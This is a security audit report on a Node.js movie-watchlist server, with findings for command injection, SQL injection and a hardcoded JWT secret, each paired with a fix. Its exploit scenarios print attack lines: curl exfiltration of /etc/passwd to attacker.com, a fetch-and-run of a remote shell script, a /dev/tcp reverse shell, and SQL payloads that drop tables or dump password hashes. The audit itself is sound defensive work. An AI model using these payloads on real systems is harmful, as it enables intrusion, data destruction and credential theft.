## Vuln 1: OS Command Injection (Unauthenticated RCE) — `server/index.ts:16-18`

* **Severity:** Critical
* **Category:** `command_injection`
* **Confidence:** 10/10
* **Description:** `req.query.service` is interpolated directly into a `child_process.exec` shell string with zero sanitization. `exec` invokes `/bin/sh -c`, so all shell metacharacters (`;`, `|`, `&&`, `` ` ``, `$()`) are executed with the Node.js process's privileges. This endpoint is unauthenticated and fully public.
* **Exploit Scenario:** `GET /api/health?service=x;curl+http://attacker.com/$(cat+/etc/passwd|base64)` — any external attacker achieves unauthenticated OS-level RCE in a single HTTP request.
* **Recommendation:** Replace `exec()` with `execFile('ping', ['-c', '1', '-W', '2', service])` and whitelist the `service` parameter to valid hostname patterns (e.g., `/^[a-zA-Z0-9.\-]+$/`).

## Vuln 2: SQL Injection (Signup) — `server/routes/auth.ts:20-23`

* **Severity:** High
* **Category:** `sql_injection`
* **Confidence:** 9/10
* **Description:** `username` from `req.body` is string-interpolated into `db.prepare(...)` before the SQL string is parsed, defeating parameterization entirely. This is equivalent to raw string concatenation.
* **Exploit Scenario:** Register with `username = "', ''); DROP TABLE users; --"` or craft second-order injection payloads that execute when the username is later read and re-used in queries.
* **Recommendation:** Use `better-sqlite3` bound parameters: `db.prepare('INSERT INTO users (username, password_hash) VALUES (?, ?)').run(username, passwordHash)`.

## Vuln 3: SQL Injection / Authentication Bypass — `server/routes/auth.ts:44-46`

* **Severity:** High
* **Category:** `sql_injection`, `authentication_bypass`
* **Confidence:** 9/10
* **Description:** `username` from `req.body` is interpolated into the `WHERE` clause. While `bcrypt.compareSync` still runs, UNION-based payloads allow full database exfiltration regardless of the password check.
* **Exploit Scenario:** `POST /api/auth/signin` with `username: "' UNION SELECT id, username, password_hash FROM users WHERE '1'='1"` dumps user records. More targeted payloads enumerate the schema or extract specific users' hashed credentials.
* **Recommendation:** `db.prepare('SELECT id, username, password_hash FROM users WHERE username = ?').get(username)`.

## Vuln 4: SQL Injection (Watchlist Check) — `server/routes/watchlist.ts:36-38`

* **Severity:** High
* **Category:** `sql_injection`
* **Confidence:** 9/10
* **Description:** `media_type` (string) and `media_id` (numeric string, no `parseInt`) from `req.query` are interpolated directly into a `SELECT` query. Requires authentication but any valid account can exploit horizontal data access.
* **Exploit Scenario:** `GET /api/watchlist/check?media_type=movie'%20UNION%20SELECT%20password_hash%20FROM%20users%20WHERE%20id=1--&media_id=1` — dumps other users' password hashes.
* **Recommendation:** `db.prepare('SELECT id FROM watchlist WHERE user_id = ? AND media_type = ? AND media_id = ?').get(req.user!.id, media_type, parseInt(media_id, 10))`.

## Vuln 5: SQL Injection (Watchlist Insert) — `server/routes/watchlist.ts:57-60`

* **Severity:** High
* **Category:** `sql_injection`
* **Confidence:** 9/10
* **Description:** `media_type`, `media_id`, `title`, and `poster_path` from `req.body` are all interpolated into an `INSERT` statement. `title` is a free-text field especially susceptible to injection.
* **Exploit Scenario:** POST with `title: "'), (1, 'movie', 999, 'injected', '')--"` inserts rows with attacker-controlled `user_id`, forging watchlist entries for other users.
* **Recommendation:** Use `db.prepare('INSERT INTO watchlist (user_id, media_type, media_id, title, poster_path) VALUES (?, ?, ?, ?, ?)').run(req.user!.id, media_type, media_id, title, poster_path || "")`.

## Vuln 6: SQL Injection (Unauthenticated Reviews) — `server/routes/reviews.ts:22-28`

* **Severity:** Critical
* **Category:** `sql_injection`
* **Confidence:** 9/10
* **Description:** The `GET /api/reviews` endpoint has **no authentication middleware**. `media_type` and `media_id` from `req.query` are interpolated into a multi-table JOIN query, enabling UNION-based data extraction by anyone.
* **Exploit Scenario:** `GET /api/reviews?media_type=movie'%20UNION%20SELECT%20id,password_hash,username,created_at,updated_at,id,username%20FROM%20users--&media_id=1` — completely unauthenticated attacker dumps the entire `users` table including bcrypt password hashes in the JSON response.
* **Recommendation:** Parameterize immediately: `db.prepare('... WHERE r.media_type = ? AND r.media_id = ?').all(media_type, parseInt(media_id, 10))`.

## Vuln 7: OS Command Injection (Watchlist Logger) — `server/routes/watchlist.ts:9-12`

* **Severity:** High
* **Category:** `command_injection`
* **Confidence:** 9/10
* **Description:** `title` from `req.body` and `username` from the JWT payload are interpolated into an `exec()` shell string used for activity logging. `$(...)` substitution executes inside double-quoted strings in bash.
* **Exploit Scenario:** Any authenticated user posts `POST /api/watchlist` with `title: "$(curl http://attacker.com/shell.sh|bash)"`. The embedded command executes server-side when `logActivity` fires, achieving RCE without any account pre-staging beyond registration.
* **Recommendation:** Replace `exec` with a simple `fs.appendFileSync` call to write the log line directly, eliminating the shell entirely.

## Vuln 8: OS Command Injection (Reviews Logger) — `server/routes/reviews.ts:9-11`

* **Severity:** High
* **Category:** `command_injection`
* **Confidence:** 9/10
* **Description:** `mediaType` from `req.body` is interpolated into `exec('logger -t movieapp "..."')`. The shell executes this string, so breaking out of the double-quoted context with `"; malicious_cmd #` achieves arbitrary command execution.
* **Exploit Scenario:** `POST /api/reviews` with `media_type: '"; /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1 #'` — any authenticated user opens a reverse shell to the attacker.
* **Recommendation:** Use `execFile('logger', ['-t', 'movieapp', `${username} ${action} review on ${mediaType}/${mediaId}`])` to pass arguments without shell interpretation, or use a native logging library.

## Vuln 9: Hardcoded JWT Secret Fallback — `server/middleware/auth.ts:4`

* **Severity:** High
* **Category:** `jwt_vulnerability`, `hardcoded_credentials`
* **Confidence:** 9/10
* **Description:** The JWT secret falls back to the committed string `"dev-secret-change-in-production"` when `JWT_SECRET` is not set. The `.env` file contains no `JWT_SECRET` entry, confirming this hardcoded string is the active secret in the running application. Anyone who reads the source code can forge valid tokens for any `user.id`.
* **Exploit Scenario:** Attacker signs `{ id: 1, username: "admin" }` with the known secret using any JWT library, obtaining a token that passes `jwt.verify()` and grants full API access as user ID 1 (typically the first registered user/admin).
* **Recommendation:** Add `JWT_SECRET=<cryptographically random 256-bit value>` to `.env`, remove the fallback default, and fail startup with a clear error if the environment variable is absent.
